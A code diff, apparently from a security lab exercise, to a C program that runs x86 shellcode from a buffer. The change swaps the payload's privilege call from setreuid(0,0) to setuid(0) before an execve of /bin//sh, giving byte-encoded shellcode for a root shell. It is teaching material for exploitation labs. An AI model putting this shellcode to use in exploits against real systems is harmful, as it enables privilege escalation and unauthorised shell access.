@@ -1,13 +1,11 @@
 /* call_shellcode.c  */
 /*A program that creates a file containing code for launching shell*/
-#include <stdlib.h>
-#include <stdio.h>
+#include <string.h>
 char code[] =
-  // setreuid(0, 0)
+  // setuid(0)
   "\x31\xdb"          /* Line 1:  xorl   %ebx,%ebx   */
-  "\x31\xc9"          /* Line 2:  xorl   %ecx,%ecx   */
   "\x31\xc0"          /* Line 3:  xorl   %eax,%eax   */
-  "\xb0\xcb"          /* Line 4:  movb   $0xcb,%al   */
+  "\xb0\xd5"          /* Line 4:  movb   $0xd5,%al   */
   "\xcd\x80"          /* Line 5:  int    $0x80       */
 
   // execve(/bin//sh)
@@ -28,5 +26,5 @@ int main(int argc, char **argv)
 {
   char buf[sizeof(code)];
   strcpy(buf, code);
-  ((void(*)( ))code)( );
+  ((void(*)( ))buf)( );
 }
